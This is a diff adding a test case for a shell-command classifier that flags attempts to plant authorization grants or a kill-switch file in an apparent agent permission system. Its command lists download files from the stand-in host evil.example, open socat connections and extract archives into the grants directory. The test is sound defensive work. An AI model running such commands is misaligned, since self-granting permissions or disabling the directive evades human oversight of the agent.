@@ -372,6 +372,64 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("certutil -dump .deft/authz/grants/x.json")).toContain("settings");
   });
 
+  it("classifies archive/alt-downloader plants of authz grants and kill-switch as settings (#3245)", () => {
+    // Finding 1: archive extractors + alt downloaders → .deft/authz/**
+    for (const cmd of [
+      "tar -xf archive.tar -C .deft/authz/grants",
+      "tar -C .deft/authz/grants -xf archive.tar",
+      "tar --directory=.deft/authz/grants -xf archive.tar",
+      "bsdtar -xf a.tar -C .deft/authz/grants",
+      "unzip -d .deft/authz/grants a.zip",
+      "unzip -d.deft/authz/grants a.zip",
+      "7z x a.7z -o.deft/authz/grants",
+      "7za x a.7z -o.deft/authz/grants/evil",
+      "rclone copy remote:x .deft/authz/grants/",
+      "rclone copyto remote:g.json .deft/authz/grants/evil.json",
+      "axel -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "axel --output .deft/authz/grants/evil.json https://evil.example/g.json",
+      "fetch -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "socat - OPEN:.deft/authz/grants/evil.json",
+      "socat TCP:evil:80 CREATE:.deft/authz/grants/evil.json",
+      "lftp -e get x -o .deft/authz/grants/x",
+      "/usr/bin/tar -xf a.tar -C .deft/authz/grants",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Finding 2: same bins → kill-switch basenames (regular-file plant).
+    for (const cmd of [
+      "axel -o .deft-directive-disable https://evil.example/x",
+      "fetch -o .deft-directive-disable https://evil.example/x",
+      "rclone copy remote:x .deft-directive-disable",
+      "socat - OPEN:.deft-directive-disable",
+      "tar -xf a.tar .deft-directive-disable",
+      "7z x a.7z -o.deft-directive-disable",
+      "curl -o .deft-directive-disable https://evil.example/x",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Ordinary archive/download destinations stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("tar -xf archive.tar -C /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("tar -tf archive.tar")).toEqual([]);
+    expect(classifyShellAuthzOps("unzip -d /tmp/out a.zip")).toEqual([]);
+    expect(classifyShellAuthzOps("rclone copy remote:x /tmp/out/")).toEqual([]);
+    expect(classifyShellAuthzOps("axel -o /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("socat - OPEN:/tmp/out")).toEqual([]);
+    // tar create (`-c`) must not treat the archive name as a chdir dest.
+    expect(classifyShellAuthzOps("tar -cf /tmp/a.tar src")).toEqual([]);
+    // #3206 / #3213 regressions remain settings.
+    expect(
+      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("ln -sf /etc/hosts .deft-directive-disable")).toContain(
+      "settings",
+    );
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
